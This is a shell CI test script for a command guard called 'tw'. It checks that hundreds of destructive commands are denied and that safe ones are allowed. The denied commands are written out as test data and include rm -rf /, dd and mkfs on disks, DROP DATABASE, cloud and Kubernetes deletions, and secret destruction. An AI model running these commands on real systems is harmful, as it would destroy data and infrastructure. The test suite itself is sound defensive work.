#!/bin/sh
set -e

# =============================================================================
# TW Destructive Command CI Tests
# =============================================================================
# Extensive test suite verifying that TW correctly blocks destructive commands
# across ALL pack categories. Uses `tw test` which only evaluates commands
# (never executes them).
#
# This script is designed to run ONLY in GitHub Actions on ephemeral runners.
#
# Output: Each test prints PASS/FAIL with category, command, and expectation.
# On failure, a machine-readable report is written to FAILURE_REPORT for use
# as a regression guide.
# =============================================================================

PASS=0
FAIL=0
TOTAL=0
CATEGORY=""
FAILURE_REPORT="${TW_FAILURE_REPORT:-/tmp/tw-destructive-failures.txt}"

: > "$FAILURE_REPORT"

record_failure() {
  # $1=type (DENY|ALLOW), $2=label, $3=command, $4=expected_exit, $5=actual_exit, $6=category
  printf "%s | %s | %s | expected=%s got=%s | %s\n" \
    "$1" "$6" "$2" "$4" "$5" "$3" >> "$FAILURE_REPORT"
}

# Expect a command to be DENIED (exit 1)
expect_deny() {
  TOTAL=$((TOTAL + 1))
  set +e
  OUTPUT=$(tw test "$1" 2>/dev/null)
  EXIT=$?
  set -e
  if [ "$EXIT" -eq 1 ]; then
    PASS=$((PASS + 1))
    printf "  PASS [DENY]:  %s\n" "$2"
  else
    FAIL=$((FAIL + 1))
    printf "  FAIL [DENY]:  %s (expected exit 1, got %s)\n" "$2" "$EXIT"
    printf "                cmd: %s\n" "$1"
    record_failure "DENY" "$2" "$1" "1" "$EXIT" "$CATEGORY"
  fi
}

# Expect a command to be ALLOWED (exit 0)
expect_allow() {
  TOTAL=$((TOTAL + 1))
  set +e
  OUTPUT=$(tw test "$1" 2>/dev/null)
  EXIT=$?
  set -e
  if [ "$EXIT" -eq 0 ]; then
    PASS=$((PASS + 1))
    printf "  PASS [ALLOW]: %s\n" "$2"
  else
    FAIL=$((FAIL + 1))
    printf "  FAIL [ALLOW]: %s (expected exit 0, got %s)\n" "$2" "$EXIT"
    printf "                cmd: %s\n" "$1"
    record_failure "ALLOW" "$2" "$1" "0" "$EXIT" "$CATEGORY"
  fi
}

# Expect a command to be DENIED via hook protocol (exit 1)
expect_hook_deny() {
  TOTAL=$((TOTAL + 1))
  set +e
  OUTPUT=$(echo "$1" | tw hook 2>/dev/null)
  EXIT=$?
  set -e
  if [ "$EXIT" -eq 1 ]; then
    PASS=$((PASS + 1))
    printf "  PASS [DENY]:  %s\n" "$2"
  else
    FAIL=$((FAIL + 1))
    printf "  FAIL [DENY]:  %s (expected exit 1, got %s)\n" "$2" "$EXIT"
    record_failure "HOOK_DENY" "$2" "$1" "1" "$EXIT" "$CATEGORY"
  fi
}

# Expect a command to be ALLOWED via hook protocol (exit 0)
expect_hook_allow() {
  TOTAL=$((TOTAL + 1))
  set +e
  OUTPUT=$(echo "$1" | tw hook 2>/dev/null)
  EXIT=$?
  set -e
  if [ "$EXIT" -eq 0 ]; then
    PASS=$((PASS + 1))
    printf "  PASS [ALLOW]: %s\n" "$2"
  else
    FAIL=$((FAIL + 1))
    printf "  FAIL [ALLOW]: %s (expected exit 0, got %s)\n" "$2" "$EXIT"
    record_failure "HOOK_ALLOW" "$2" "$1" "0" "$EXIT" "$CATEGORY"
  fi
}

section() {
  CATEGORY="$1"
  echo ""
  echo "=== $1 ==="
}

# =============================================================================
section "Core: Git"
# =============================================================================
expect_deny 'git reset --hard'                        'git reset --hard'
expect_deny 'git reset --hard HEAD'                   'git reset --hard HEAD'
expect_deny 'git reset --hard HEAD~3'                 'git reset --hard HEAD~3'
expect_deny 'git reset --hard origin/main'            'git reset --hard origin/main'
expect_deny 'git reset --merge'                       'git reset --merge'
expect_deny 'git push --force'                        'git push --force'
expect_deny 'git push -f'                             'git push -f'
expect_deny 'git push origin main --force'            'git push origin main --force'
expect_deny 'git push -f origin feature'              'git push -f origin feature'
expect_deny 'git push --mirror'                       'git push --mirror'
expect_deny 'git clean -f'                            'git clean -f'
expect_deny 'git clean -fd'                           'git clean -fd'
expect_deny 'git clean -fdx'                          'git clean -fdx'
expect_deny 'git checkout -- .'                       'git checkout -- .'
expect_deny 'git checkout -- file.txt'                'git checkout -- file.txt'
expect_deny 'git checkout HEAD -- src/'               'git checkout HEAD -- src/'
expect_allow 'git restore file.txt'                    'git restore file.txt (specific file is safe)'
expect_deny 'git restore --worktree file.txt'         'git restore --worktree file.txt'
expect_deny 'git branch -D feature-branch'            'git branch -D feature-branch'
expect_deny 'git stash drop'                          'git stash drop'
expect_deny 'git stash drop stash@{0}'                'git stash drop stash@{0}'
expect_deny 'git stash clear'                         'git stash clear'

# Git safe commands (must allow)
expect_allow 'git status'                             'git status'
expect_allow 'git log --oneline'                      'git log --oneline'
expect_allow 'git diff'                               'git diff'
expect_allow 'git add .'                              'git add .'
expect_allow 'git commit -m "fix: typo"'              'git commit -m "fix: typo"'
expect_allow 'git push origin main'                   'git push origin main'
expect_allow 'git pull origin main'                   'git pull origin main'
expect_allow 'git fetch --all'                        'git fetch --all'
expect_allow 'git checkout -b new-branch'             'git checkout -b new-branch'
expect_allow 'git branch -d merged-branch'            'git branch -d merged-branch'
expect_allow 'git stash'                              'git stash'
expect_allow 'git stash list'                         'git stash list'
expect_allow 'git stash pop'                          'git stash pop'
expect_allow 'git tag v1.0.0'                         'git tag v1.0.0'
expect_allow 'git clean -n'                           'git clean -n (dry run)'
expect_allow 'git clean --dry-run'                    'git clean --dry-run'

# =============================================================================
section "Core: Filesystem"
# =============================================================================
expect_deny 'rm -rf /'                                'rm -rf /'
expect_deny 'rm -rf /home'                            'rm -rf /home'
expect_deny 'rm -rf /etc'                             'rm -rf /etc'
expect_deny 'rm -rf /var'                             'rm -rf /var'
expect_deny 'rm -rf /usr'                             'rm -rf /usr'
expect_deny 'rm -rf ./src'                            'rm -rf ./src'
expect_deny 'rm -rf ./build'                          'rm -rf ./build'
expect_deny 'rm -r -f /var/log'                       'rm -r -f /var/log'
expect_deny 'rm --recursive --force /opt'             'rm --recursive --force /opt'
expect_deny 'rm -r /important-data'                   'rm -r /important-data'
expect_deny 'rm -fr /'                                'rm -fr / (flag reorder)'

# Filesystem safe commands
expect_allow 'rm -rf /tmp/build'                      'rm -rf /tmp/build (safe temp path)'
expect_allow 'rm -rf /tmp/mydir'                      'rm -rf /tmp/mydir (safe temp path)'
expect_allow 'ls -la'                                 'ls -la'
expect_allow 'cat file.txt'                           'cat file.txt'
expect_allow 'mkdir -p ./build'                       'mkdir -p ./build'
expect_allow 'cp -r src/ dst/'                        'cp -r src/ dst/'
expect_allow 'mv old.txt new.txt'                     'mv old.txt new.txt'

# =============================================================================
section "Database: PostgreSQL"
# =============================================================================
expect_deny 'DROP DATABASE production'                'DROP DATABASE production'
expect_deny 'DROP DATABASE IF EXISTS mydb'            'DROP DATABASE IF EXISTS mydb'
expect_deny 'DROP TABLE users'                        'DROP TABLE users'
expect_deny 'DROP TABLE IF EXISTS sessions'           'DROP TABLE IF EXISTS sessions'
expect_deny 'DROP SCHEMA public CASCADE'              'DROP SCHEMA public CASCADE'
expect_deny 'TRUNCATE TABLE orders'                   'TRUNCATE TABLE orders'
expect_deny 'DELETE FROM users'                       'DELETE FROM users (no WHERE)'
expect_deny 'dropdb production'                       'dropdb production'
expect_deny 'pg_dump --clean mydb'                    'pg_dump --clean mydb'
expect_deny 'psql -c "DROP DATABASE test"'            'psql -c DROP DATABASE'

# PostgreSQL safe commands
expect_allow 'SELECT * FROM users LIMIT 10'           'SELECT query'
expect_allow 'psql -c "SELECT 1"'                     'psql SELECT'
expect_allow 'pg_dump mydb > backup.sql'              'pg_dump (no --clean)'

# =============================================================================
section "Database: MySQL"
# =============================================================================
expect_deny 'DROP DATABASE production'                'MySQL DROP DATABASE'
expect_deny 'DROP TABLE orders'                       'MySQL DROP TABLE'
expect_deny 'TRUNCATE TABLE sessions'                 'MySQL TRUNCATE TABLE'
expect_deny 'DELETE FROM logs'                        'MySQL DELETE without WHERE'
expect_deny 'mysqladmin drop mydb'                    'mysqladmin drop'
expect_deny 'mysqldump --add-drop-database mydb'      'mysqldump --add-drop-database'
expect_deny 'mysqldump --add-drop-table mydb'         'mysqldump --add-drop-table'
expect_deny 'DROP USER appuser'                       'DROP USER'
expect_deny 'RESET MASTER'                            'RESET MASTER'

# =============================================================================
section "Database: MongoDB"
# =============================================================================
expect_deny 'mongosh --eval "db.dropDatabase()"'     'mongosh dropDatabase'
expect_deny 'mongosh --eval "db.users.drop()"'       'mongosh collection drop'
expect_deny 'mongorestore --drop /backup'             'mongorestore --drop'

# =============================================================================
section "Database: Redis"
# =============================================================================
expect_deny 'redis-cli FLUSHALL'                      'redis-cli FLUSHALL'
expect_deny 'redis-cli FLUSHDB'                       'redis-cli FLUSHDB'
expect_deny 'redis-cli DEBUG CRASH'                   'redis-cli DEBUG CRASH'
expect_deny 'redis-cli DEBUG SLEEP 999'               'redis-cli DEBUG SLEEP'
expect_deny 'redis-cli SHUTDOWN'                      'redis-cli SHUTDOWN'
expect_deny 'redis-cli CONFIG SET maxmemory 1'        'redis-cli CONFIG SET maxmemory'
expect_deny 'redis-cli CONFIG SET maxmemory-policy noeviction' \
                                                      'redis-cli CONFIG SET maxmemory-policy'
expect_deny 'redis-cli CONFIG SET save ""'            'redis-cli CONFIG SET save'
expect_deny 'redis-cli CONFIG SET appendonly no'      'redis-cli CONFIG SET appendonly'
expect_deny 'redis-cli CONFIG REWRITE'                'redis-cli CONFIG REWRITE'

# =============================================================================
section "Database: SQLite"
# =============================================================================
expect_deny 'sqlite3 mydb.db "DROP TABLE users"'      'sqlite3 DROP TABLE'
expect_deny 'sqlite3 mydb.db "DELETE FROM logs"'       'sqlite3 DELETE without WHERE'
expect_deny 'sqlite3 mydb.db "VACUUM INTO /tmp/copy.db"' \
                                                       'sqlite3 VACUUM INTO'
expect_deny 'sqlite3 mydb.db < destructive.sql'        'sqlite3 stdin redirect'

# =============================================================================
section "Database: Supabase"
# =============================================================================
expect_deny 'supabase db reset'                        'supabase db reset'
expect_deny 'supabase db push'                         'supabase db push'
expect_deny 'supabase functions delete my-func'        'supabase functions delete'
expect_deny 'supabase projects delete'                 'supabase projects delete'
expect_deny 'supabase stop --no-backup'                'supabase stop --no-backup'
expect_deny 'supabase migration repair'                'supabase migration repair'
expect_deny 'supabase migration down'                  'supabase migration down'
expect_deny 'supabase migration squash'                'supabase migration squash'
expect_deny 'supabase storage rm bucket/file'          'supabase storage rm'
expect_deny 'supabase secrets unset MY_SECRET'         'supabase secrets unset'
expect_deny 'supabase branches delete mybranch'        'supabase branches delete'
expect_deny 'supabase domains delete'                  'supabase domains delete'
expect_deny 'supabase orgs delete myorg'               'supabase orgs delete'
expect_deny 'supabase config push'                     'supabase config push'

# =============================================================================
section "Database: Cassandra"
# =============================================================================
expect_deny 'DROP KEYSPACE production'                 'DROP KEYSPACE'
expect_deny 'TRUNCATE TABLE events'                    'Cassandra TRUNCATE TABLE'

# =============================================================================
section "Database: ClickHouse"
# =============================================================================
expect_deny 'DROP DATABASE analytics'                  'ClickHouse DROP DATABASE'
expect_deny 'TRUNCATE TABLE metrics'                   'ClickHouse TRUNCATE TABLE'

# =============================================================================
section "Database: Snowflake"
# =============================================================================
expect_deny 'DROP DATABASE warehouse'                  'Snowflake DROP DATABASE'
expect_deny 'DROP SCHEMA raw_data'                     'Snowflake DROP SCHEMA'
expect_deny 'TRUNCATE TABLE staging'                   'Snowflake TRUNCATE TABLE'

# =============================================================================
section "Cloud: AWS"
# =============================================================================
expect_deny 'aws ec2 terminate-instances --instance-ids i-12345' \
                                                       'aws ec2 terminate-instances'
expect_deny 'aws ec2 delete-snapshot --snapshot-id snap-123' \
                                                       'aws ec2 delete-snapshot'
expect_deny 'aws ec2 delete-volume --volume-id vol-123' \
                                                       'aws ec2 delete-volume'
expect_deny 'aws ec2 delete-vpc --vpc-id vpc-123'     'aws ec2 delete-vpc'
expect_deny 'aws ec2 delete-subnet --subnet-id sub-123' \
                                                       'aws ec2 delete-subnet'
expect_deny 'aws ec2 delete-security-group --group-id sg-123' \
                                                       'aws ec2 delete-security-group'
expect_deny 'aws ec2 delete-key-pair --key-name mykey' \
                                                       'aws ec2 delete-key-pair'
expect_deny 'aws ec2 delete-image --image-id ami-123' 'aws ec2 delete-image (deregister AMI)'
expect_deny 'aws s3 rm s3://my-bucket --recursive'    'aws s3 rm --recursive'
expect_deny 'aws s3 rb s3://my-bucket --force'        'aws s3 rb --force'
expect_deny 'aws s3 sync . s3://bucket --delete'      'aws s3 sync --delete'
expect_deny 'aws s3api delete-bucket --bucket mybucket' \
                                                       'aws s3api delete-bucket'
expect_deny 'aws rds delete-db-instance --db-instance-identifier prod' \
                                                       'aws rds delete-db-instance'
expect_deny 'aws cloudformation delete-stack --stack-name prod' \
                                                       'aws cloudformation delete-stack'
expect_deny 'aws lambda delete-function --function-name handler' \
                                                       'aws lambda delete-function'
expect_deny 'aws iam delete-user --user-name admin'   'aws iam delete-user'
expect_deny 'aws dynamodb delete-table --table-name users' \
                                                       'aws dynamodb delete-table'
expect_deny 'aws eks delete-cluster --name production' 'aws eks delete-cluster'
expect_deny 'aws ecr delete-repository --repository-name app' \
                                                       'aws ecr delete-repository'
expect_deny 'aws ecr batch-delete-image --repository-name app --image-ids imageTag=latest' \
                                                       'aws ecr batch-delete-image'
expect_deny 'aws ecr delete-lifecycle-policy --repository-name app' \
                                                       'aws ecr delete-lifecycle-policy'
expect_deny 'aws logs delete-log-group --log-group-name /app/prod' \
                                                       'aws logs delete-log-group'
expect_deny 'aws logs delete-log-stream --log-group-name /app --log-stream-name stream1' \
                                                       'aws logs delete-log-stream'

# AWS safe commands
expect_allow 'aws ec2 describe-instances'              'aws ec2 describe-instances'
expect_allow 'aws s3 ls'                               'aws s3 ls'
expect_allow 'aws s3 cp file.txt s3://bucket/'         'aws s3 cp'
expect_allow 'aws sts get-caller-identity'             'aws sts get-caller-identity'
expect_allow 'aws ec2 describe-instances --dry-run'    'aws describe --dry-run'
expect_allow 'aws ecr get-login-password'              'aws ecr get-login'
expect_allow 'aws cloudformation describe-stacks'      'aws cfn describe-stacks'

# =============================================================================
section "Cloud: GCP"
# =============================================================================
expect_deny 'gcloud compute instances delete myvm'     'gcloud compute instances delete'
expect_deny 'gcloud compute disks delete mydisk'       'gcloud compute disks delete'
expect_deny 'gcloud sql instances delete mydb'         'gcloud sql instances delete'
expect_deny 'gsutil rm -r gs://my-bucket'              'gsutil rm -r'
expect_deny 'gsutil rb gs://my-bucket'                 'gsutil rb'
expect_deny 'gcloud container clusters delete mycluster' \
                                                       'gcloud GKE delete'
expect_deny 'gcloud projects delete my-project'        'gcloud projects delete'
expect_deny 'gcloud functions delete my-function'      'gcloud functions delete'
expect_deny 'gcloud pubsub topics delete my-topic'     'gcloud pubsub delete'
expect_deny 'gcloud firestore databases delete'        'gcloud firestore delete'
expect_deny 'gcloud container images delete gcr.io/proj/img' \
                                                       'gcloud container images delete'
expect_deny 'gcloud artifacts docker images delete us-docker.pkg.dev/proj/repo/img' \
                                                       'gcloud artifacts docker images delete'
expect_deny 'gcloud artifacts repositories delete myrepo' \
                                                       'gcloud artifacts repositories delete'

# =============================================================================
section "Cloud: Azure"
# =============================================================================
expect_deny 'az vm delete -g mygroup -n myvm'          'az vm delete'
expect_deny 'az storage account delete -n myaccount'   'az storage account delete'
expect_deny 'az storage blob delete-batch -s container' \
                                                       'az storage blob delete-batch'
expect_deny 'az storage blob delete -c container -n blob' \
                                                       'az storage blob delete'
expect_deny 'az sql server delete -g rg -n server'     'az sql server delete'
expect_deny 'az group delete -n myresourcegroup'       'az group delete'
expect_deny 'az aks delete -g rg -n cluster'           'az aks delete'
expect_deny 'az webapp delete -g rg -n app'            'az webapp delete'
expect_deny 'az functionapp delete -g rg -n func'      'az functionapp delete'
expect_deny 'az cosmosdb delete -g rg -n cosmos'       'az cosmosdb delete'
expect_deny 'az keyvault delete -n myvault'            'az keyvault delete'
expect_deny 'az network vnet delete -g rg -n myvnet'   'az network vnet delete'
expect_deny 'az acr delete -n myregistry'              'az acr delete'
expect_deny 'az acr repository delete -n myreg --repository myrepo' \
                                                       'az acr repository delete'

# =============================================================================
section "Cloud: Other Providers"
# =============================================================================
expect_deny 'doctl compute droplet delete 12345'       'DigitalOcean droplet delete'
expect_deny 'heroku apps:destroy myapp'                'Heroku apps:destroy'
expect_deny 'vercel rm my-project'                     'Vercel rm'
expect_deny 'netlify sites:delete'                     'Netlify sites:delete'

# =============================================================================
section "Containers: Docker"
# =============================================================================
expect_deny 'docker system prune'                      'docker system prune'
expect_deny 'docker system prune -af'                  'docker system prune -af'
expect_deny 'docker volume prune'                      'docker volume prune'
expect_deny 'docker volume prune -f'                   'docker volume prune -f'
expect_deny 'docker network prune'                     'docker network prune'
expect_deny 'docker image prune'                       'docker image prune'
expect_deny 'docker container prune'                   'docker container prune'
expect_deny 'docker rm -f mycontainer'                 'docker rm -f'
expect_deny 'docker rmi -f myimage'                    'docker rmi -f'
expect_deny 'docker volume rm myvolume'                'docker volume rm'
expect_deny 'docker stop $(docker ps -aq)'             'docker stop all containers'

# Docker safe commands
expect_allow 'docker ps'                               'docker ps'
expect_allow 'docker images'                           'docker images'
expect_allow 'docker logs mycontainer'                 'docker logs'
expect_allow 'docker build -t myimage .'               'docker build'
expect_allow 'docker run -it ubuntu bash'              'docker run'
expect_allow 'docker pull nginx:latest'                'docker pull'
expect_allow 'docker inspect mycontainer'              'docker inspect'
expect_allow 'docker stats'                            'docker stats'
expect_allow 'docker exec mycontainer ls'              'docker exec'

# =============================================================================
section "Containers: Docker Compose"
# =============================================================================
expect_deny 'docker-compose down -v'                   'docker-compose down -v'
expect_deny 'docker-compose down --rmi all'            'docker-compose down --rmi all'
expect_deny 'docker-compose rm -v'                     'docker-compose rm -v'
expect_deny 'docker-compose rm -f'                     'docker-compose rm -f'

# =============================================================================
section "Containers: Podman"
# =============================================================================
expect_deny 'podman system prune'                      'podman system prune'
expect_deny 'podman volume prune'                      'podman volume prune'
expect_deny 'podman pod prune'                         'podman pod prune'
expect_deny 'podman image prune'                       'podman image prune'
expect_deny 'podman container prune'                   'podman container prune'
expect_deny 'podman rm -f mycontainer'                 'podman rm -f'
expect_deny 'podman rmi -f myimage'                    'podman rmi -f'
expect_deny 'podman volume rm myvolume'                'podman volume rm'

# =============================================================================
section "Kubernetes: kubectl"
# =============================================================================
expect_deny 'kubectl delete namespace production'      'kubectl delete namespace'
expect_deny 'kubectl delete ns staging'                'kubectl delete ns'
expect_deny 'kubectl delete --all pods'                'kubectl delete --all pods'
expect_deny 'kubectl delete --all pods --all-namespaces' \
                                                       'kubectl delete all namespaces'
expect_deny 'kubectl drain node01'                     'kubectl drain node'
expect_deny 'kubectl cordon node01'                    'kubectl cordon node'
expect_deny 'kubectl taint nodes node01 key=value:NoExecute' \
                                                       'kubectl taint NoExecute'
expect_deny 'kubectl delete deployment nginx -n prod'  'kubectl delete deployment'
expect_deny 'kubectl delete pvc data-volume'           'kubectl delete pvc'
expect_deny 'kubectl delete pv my-pv'                  'kubectl delete pv'
expect_deny 'kubectl scale deployment app --replicas=0' \
                                                       'kubectl scale to zero'
expect_deny 'kubectl delete pod mypod --force --grace-period=0' \
                                                       'kubectl delete --force'
expect_deny 'kubectl apply --force -f deployment.yaml' 'kubectl apply --force'
expect_deny 'kubectl delete -f /path/to/manifests/'    'kubectl delete from directory'

# Kubernetes safe commands
expect_allow 'kubectl get pods'                        'kubectl get pods'
expect_allow 'kubectl describe pod mypod'              'kubectl describe'
expect_allow 'kubectl logs mypod'                      'kubectl logs'
expect_allow 'kubectl get all -n default'              'kubectl get all'
expect_allow 'kubectl top pods'                        'kubectl top pods'
expect_allow 'kubectl config current-context'          'kubectl config'
expect_allow 'kubectl version'                         'kubectl version'
expect_allow 'kubectl diff -f deployment.yaml'         'kubectl diff'
expect_allow 'kubectl explain pods'                    'kubectl explain'

# =============================================================================
section "Kubernetes: Helm"
# =============================================================================
expect_deny 'helm uninstall myrelease'                 'helm uninstall'
expect_deny 'helm rollback myrelease 1'                'helm rollback'
expect_deny 'helm upgrade myrelease chart --force'     'helm upgrade --force'
expect_deny 'helm upgrade myrelease chart --reset-values' \
                                                       'helm upgrade --reset-values'

# =============================================================================
section "Kubernetes: Kustomize"
# =============================================================================
expect_deny 'kubectl delete -k .'                      'kubectl delete -k'
expect_deny 'kustomize build . | kubectl delete -f -'  'kustomize pipe to kubectl delete'

# =============================================================================
section "Infrastructure: Terraform"
# =============================================================================
expect_deny 'terraform destroy'                        'terraform destroy'
expect_deny 'terraform destroy -auto-approve'          'terraform destroy -auto-approve'
expect_deny 'terraform apply -auto-approve'            'terraform apply -auto-approve'
expect_deny 'terraform taint aws_instance.example'     'terraform taint'
expect_deny 'terraform state rm aws_instance.example'  'terraform state rm'
expect_deny 'terraform state mv old new'               'terraform state mv'
expect_deny 'terraform force-unlock 12345'             'terraform force-unlock'
expect_deny 'terraform workspace delete staging'       'terraform workspace delete'

# Terraform safe commands
expect_allow 'terraform plan'                          'terraform plan'
expect_allow 'terraform init'                          'terraform init'
expect_allow 'terraform validate'                      'terraform validate'
expect_allow 'terraform fmt'                           'terraform fmt'
expect_allow 'terraform show'                          'terraform show'
expect_allow 'terraform output'                        'terraform output'
expect_allow 'terraform state list'                    'terraform state list'
expect_allow 'terraform state show resource'           'terraform state show'
expect_allow 'terraform version'                       'terraform version'
expect_allow 'terraform graph'                         'terraform graph'
expect_allow 'terraform providers'                     'terraform providers'

# =============================================================================
section "Infrastructure: Pulumi"
# =============================================================================
expect_deny 'pulumi destroy'                           'pulumi destroy'
expect_deny 'pulumi destroy --yes'                     'pulumi destroy --yes'
expect_deny 'pulumi up --yes'                          'pulumi up --yes'
expect_deny 'pulumi state delete urn'                  'pulumi state delete'
expect_deny 'pulumi stack rm mystack'                  'pulumi stack rm'
expect_deny 'pulumi refresh --yes'                     'pulumi refresh --yes'
expect_deny 'pulumi cancel'                            'pulumi cancel'

# =============================================================================
section "Infrastructure: CDK & Serverless"
# =============================================================================
expect_deny 'cdk destroy'                              'cdk destroy'
expect_deny 'sls remove'                               'serverless remove'

# =============================================================================
section "Infrastructure: Ansible"
# =============================================================================
expect_deny 'ansible all -m shell -a "rm -rf /"'       'ansible shell rm -rf'
expect_deny 'ansible all -m shell -a "reboot"'         'ansible shell reboot'
expect_deny 'ansible-playbook playbook.yml -e "delete=true"' \
                                                       'ansible extra-vars delete'

# =============================================================================
section "System: Disk Operations"
# =============================================================================
expect_deny 'dd if=/dev/zero of=/dev/sda'              'dd to device'
expect_deny 'dd if=/dev/urandom of=/dev/sdb bs=1M'     'dd wipe device'
expect_deny 'fdisk /dev/sda'                           'fdisk edit'
expect_deny 'parted /dev/sda mklabel gpt'              'parted modify'
expect_deny 'mkfs.ext4 /dev/sda1'                      'mkfs format'
expect_deny 'wipefs -a /dev/sda'                       'wipefs device'
expect_deny 'mount --bind / /mnt'                      'mount bind root'
expect_deny 'umount -f /mnt'                           'umount force'
expect_deny 'losetup /dev/loop0 disk.img'              'losetup device'
expect_deny 'mdadm --stop /dev/md0'                    'mdadm stop'
expect_deny 'mdadm --remove /dev/md0 /dev/sda1'        'mdadm remove'
expect_deny 'mdadm --fail /dev/md0 /dev/sda1'          'mdadm fail'
expect_deny 'mdadm --zero-superblock /dev/sda1'        'mdadm zero-superblock'
expect_deny 'mdadm --create /dev/md0 --level=1 --raid-devices=2 /dev/sda1 /dev/sdb1' \
                                                       'mdadm create'
expect_deny 'mdadm --grow /dev/md0 --size=max'         'mdadm grow'
expect_deny 'btrfs subvolume delete /mnt/subvol'       'btrfs subvolume delete'
expect_deny 'btrfs device remove /dev/sdb /mnt/data'   'btrfs device remove'
expect_deny 'btrfs device add /dev/sdc /mnt/data'      'btrfs device add'
expect_deny 'btrfs balance start /mnt/data'            'btrfs balance'
expect_deny 'btrfs check --repair /dev/sda1'           'btrfs check --repair'
expect_deny 'btrfs rescue super-recover /dev/sda1'     'btrfs rescue'
expect_deny 'btrfs filesystem resize -5g /mnt/data'    'btrfs filesystem resize'
expect_deny 'dmsetup remove mydevice'                  'dmsetup remove'
expect_deny 'dmsetup remove_all'                       'dmsetup remove_all'
expect_deny 'dmsetup wipe_table mydevice'              'dmsetup wipe_table'
expect_deny 'dmsetup clear mydevice'                   'dmsetup clear'
expect_deny 'dmsetup load mydevice table.txt'          'dmsetup load'
expect_deny 'dmsetup create mydevice table.txt'        'dmsetup create'
expect_deny 'nbd-client -d /dev/nbd0'                  'nbd-client disconnect'
expect_deny 'nbd-client server 10809 /dev/nbd0'        'nbd-client connect'
expect_deny 'pvremove /dev/sda1'                       'pvremove'
expect_deny 'vgremove myvg'                            'vgremove'
expect_deny 'lvremove /dev/myvg/mylv'                  'lvremove'
expect_deny 'vgreduce myvg /dev/sda1'                  'vgreduce'
expect_deny 'lvreduce -L 10G /dev/myvg/mylv'           'lvreduce'
expect_deny 'lvresize -L -5G /dev/myvg/mylv'           'lvresize shrink'
expect_deny 'pvmove /dev/sda1 /dev/sdb1'               'pvmove'
expect_deny 'lvconvert --merge /dev/myvg/snap'         'lvconvert merge'

# Disk safe commands
expect_allow 'lsblk'                                   'lsblk'
expect_allow 'fdisk -l'                                'fdisk -l (list only)'
expect_allow 'df -h'                                   'df -h'
expect_allow 'blkid'                                   'blkid'
expect_allow 'dd if=/dev/zero of=output.img bs=1M count=100' \
                                                       'dd to file (not device)'
expect_allow 'parted /dev/sda print'                   'parted print (read-only)'
expect_allow 'mdadm --detail /dev/md0'                 'mdadm --detail (read-only)'
expect_allow 'mdadm --examine /dev/sda1'               'mdadm --examine (read-only)'

# =============================================================================
section "System: Permissions"
# =============================================================================
expect_deny 'chmod 777 /etc/passwd'                    'chmod 777 sensitive file'
expect_deny 'chmod -R 777 /'                           'chmod -R 777 root'
expect_deny 'chown -R root:root /'                     'chown -R root on root'
expect_deny 'chmod u+s /usr/bin/myapp'                 'chmod setuid'
expect_deny 'chmod g+s /usr/bin/myapp'                 'chmod setgid'
expect_deny 'chown root: /usr/bin/myapp'               'chown to root'
expect_deny 'setfacl -R -m u:nobody:rwx /etc'          'setfacl recursive on /etc'

# =============================================================================
section "System: Services"
# =============================================================================
expect_deny 'systemctl stop sshd'                      'systemctl stop sshd'
expect_deny 'systemctl stop docker'                    'systemctl stop docker'
expect_deny 'systemctl stop containerd'                'systemctl stop containerd'
expect_deny 'systemctl stop firewalld'                 'systemctl stop firewalld'
expect_deny 'service sshd stop'                        'service sshd stop'
expect_deny 'systemctl isolate rescue.target'          'systemctl isolate'
expect_deny 'systemctl poweroff'                       'systemctl poweroff'
expect_deny 'systemctl reboot'                         'systemctl reboot'
expect_deny 'shutdown -h now'                          'shutdown -h now'
expect_deny 'reboot'                                   'reboot'
expect_deny 'init 0'                                   'init 0'
expect_deny 'init 6'                                   'init 6'

# =============================================================================
section "Remote: SSH"
# =============================================================================
expect_deny 'ssh user@host "rm -rf /"'                 'ssh remote rm -rf'
expect_deny 'ssh root@prod "git reset --hard"'         'ssh remote git reset --hard'
expect_deny 'ssh user@host "git clean -fd"'            'ssh remote git clean'
expect_deny 'ssh-keygen -R host'                       'ssh-keygen remove host'
expect_deny 'ssh-add -D'                               'ssh-add delete all'
expect_deny 'ssh root@host "sudo rm -rf /var"'         'ssh remote sudo rm -rf'

# =============================================================================
section "Remote: rsync"
# =============================================================================
expect_deny 'rsync -av --delete source/ dest/'         'rsync --delete'
expect_deny 'rsync -av --del source/ dest/'            'rsync --del (short)'

# =============================================================================
section "Remote: SCP"
# =============================================================================
expect_deny 'scp -r localdir/ root@host:/'             'scp recursive to root'
expect_deny 'scp -r files/ user@host:/etc/'            'scp to /etc'
expect_deny 'scp -r files/ user@host:/boot/'           'scp to /boot'
expect_deny 'scp -r files/ user@host:/usr/'            'scp to /usr'
expect_deny 'scp -r files/ user@host:/var/'            'scp to /var'
expect_deny 'scp -r files/ user@host:/bin/'            'scp to /bin'
expect_deny 'scp -r files/ user@host:/lib/'            'scp to /lib'

# =============================================================================
section "Secrets: HashiCorp Vault"
# =============================================================================
expect_deny 'vault secrets disable secret/'            'vault secrets disable'
expect_deny 'vault kv destroy secret/myapp'            'vault kv destroy'
expect_deny 'vault kv metadata delete secret/myapp'    'vault kv metadata delete'
expect_deny 'vault kv delete secret/myapp'             'vault kv delete'
expect_deny 'vault delete secret/myapp'                'vault delete'
expect_deny 'vault policy delete mypolicy'             'vault policy delete'
expect_deny 'vault auth disable userpass/'             'vault auth disable'
expect_deny 'vault token revoke s.xxxxxxxx'            'vault token revoke'
expect_deny 'vault lease revoke lease-id'              'vault lease revoke'

# Vault safe commands
expect_allow 'vault status'                            'vault status'
expect_allow 'vault version'                           'vault version'
expect_allow 'vault kv get secret/myapp'               'vault kv get'
expect_allow 'vault kv list secret/'                   'vault kv list'
expect_allow 'vault secrets list'                      'vault secrets list'
expect_allow 'vault auth list'                         'vault auth list'
expect_allow 'vault policy list'                       'vault policy list'
expect_allow 'vault token lookup'                      'vault token lookup'
expect_allow 'vault audit list'                        'vault audit list'
expect_allow 'vault lease lookup lease-id'             'vault lease lookup'

# =============================================================================
section "Secrets: AWS Secrets Manager & SSM"
# =============================================================================
expect_deny 'aws secretsmanager delete-secret --secret-id prod/db' \
                                                       'aws secretsmanager delete-secret'
expect_deny 'aws secretsmanager delete-secret --secret-id key --force-delete-without-recovery' \
                                                       'aws secretsmanager force delete'
expect_deny 'aws secretsmanager delete-resource-policy --secret-id key' \
                                                       'aws secretsmanager delete-resource-policy'
expect_deny 'aws secretsmanager update-secret --secret-id key --secret-string newval' \
                                                       'aws secretsmanager update-secret'
expect_deny 'aws secretsmanager put-secret-value --secret-id key --secret-string newval' \
                                                       'aws secretsmanager put-secret-value'
expect_deny 'aws ssm delete-parameter --name /app/key' 'aws ssm delete-parameter'
